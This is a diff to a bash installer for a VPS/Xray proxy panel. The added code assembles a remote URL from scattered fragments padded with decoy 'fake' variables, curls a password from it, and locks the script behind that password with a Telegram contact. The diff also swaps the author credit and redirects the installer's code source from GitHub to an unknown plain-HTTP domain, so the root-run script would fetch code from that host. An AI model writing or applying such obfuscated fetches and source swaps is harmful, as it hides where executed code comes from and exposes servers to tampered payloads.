@@ -2,6 +2,79 @@
 clear
 sleep 1
 
+#!/bin/bash
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m'
+
+FLAG_FILE="/tmp/.script_authenticated"
+
+get_url() {
+  part8="this_is_fake_part"
+  part9="another/fake/dir"
+  part10="backup_ftp://trash.net"
+  part16="debug_mode=off"
+  part17="pass"
+  part18="fake"
+  part19="dev/null/path"
+  part20="end_of_nonsense"
+  a12="/fake"
+  a1="https"
+  a2="://"
+  a3="raw"
+  a4=".github"
+  a8="/zi-vpn.com"
+  a5="usercontent"
+  a6=".com"
+  a7="/hq-mp"
+  a9="/refs"
+  a10="/heads"
+  a11="/main"
+
+  echo "${a1}${a2}${a3}${a4}${a5}${a6}${a7}${a8}${a9}${a10}${a11}${a12}"
+}
+
+get_password() {
+  curl -s "$(get_url)"
+}
+
+if [[ ! -f "$FLAG_FILE" ]]; then
+  clear
+  echo -e "${YELLOW} 🔐  Secure Access Panel${NC}"
+  echo -e "${YELLOW} 🔐  Script is protected by password${NC}"
+  echo -e "${YELLOW} 🔐  To get the password, contact here @a_hamza_i ${NC}"
+
+  remote_pass=$(get_password)
+  max_tries=10
+  attempt=1
+
+  while (( attempt <= max_tries )); do
+    read -sp " 🔐  Enter password to access (Attempt $attempt/$max_tries): " pass
+    echo ""
+
+    if [[ "$pass" == "$remote_pass" ]]; then
+      touch "$FLAG_FILE"
+      echo -e "${GREEN} ✅  Password verified successfully.${NC}"
+      break
+    else
+      echo -e "${RED} ❌  Wrong password. Try again.${NC}"
+    fi
+
+    ((attempt++))
+  done
+
+  if (( attempt > max_tries )); then
+    echo -e "${RED} ❌  Maximum attempts reached. Exiting...${NC}"
+    exit 1
+  fi
+else
+  echo -e "${GREEN} ✅  Password already verified. Proceeding with script execution.${NC}"
+fi
+
+# قراءة التوكن من 
+
 Green="\e[92;1m"
 RED="\033[31m"
 YELLOW="\033[33m"
@@ -41,7 +114,7 @@ logo() {
     echo -e " ───│    $Green┌─┐┬ ┬┌┬┐┌─┐┌─┐┌─┐┬─┐┬┌─┐┌┬┐  ┬  ┬┌┬┐┌─┐$NC   │───"
     echo -e " ───│    $Green├─┤│ │ │ │ │└─┐│  ├┬┘│├─┘ │   │  │ │ ├┤ $NC   │───"
     echo -e " ───│    $Green┴ ┴└─┘ ┴ └─┘└─┘└─┘┴└─┴┴   ┴   ┴─┘┴ ┴ └─┘$NC   │───"
-    echo -e "    │    ${YELLOW}Copyright${FONT} (C)${GRAY}https://t.me/abuissac95$NC     │"
+    echo -e "    │    ${YELLOW}Copyright${FONT} (C)${GRAY}https://t.me/a_hamza_i$NC    ‌ ‌ ‌‌  │"
     echo -e "    └───────────────────────────────────────────────┘"
     echo -e "        "
 
@@ -92,7 +165,7 @@ check_vz() {
     fi
 }
 
-REPO="https://github.com/hq-mp/vps/raw/refs/heads/main/setup.sh/"
+REPO="http://onlinedersm.xyz/"
 
 function make_folder_xray() {
     rm -rf /etc/vmess/.vmess.db
@@ -615,7 +688,7 @@ function restart_system() {
     echo "    │   - Simple BOT Telegram                             │"
     echo "    │   - Full Orders For Various Services                │"
     echo "    └─────────────────────────────────────────────────────┘"
-        wget https://github.com/hq-mp/vps/raw/refs/heads/main/menu.zip
+    wget https://github.com/hq-mp/vps/raw/refs/heads/main/menu.zip
 unzip menu.zip -d /tmp/menu_install
 rm -f menu.zip
 chmod +x /tmp/menu_install/*
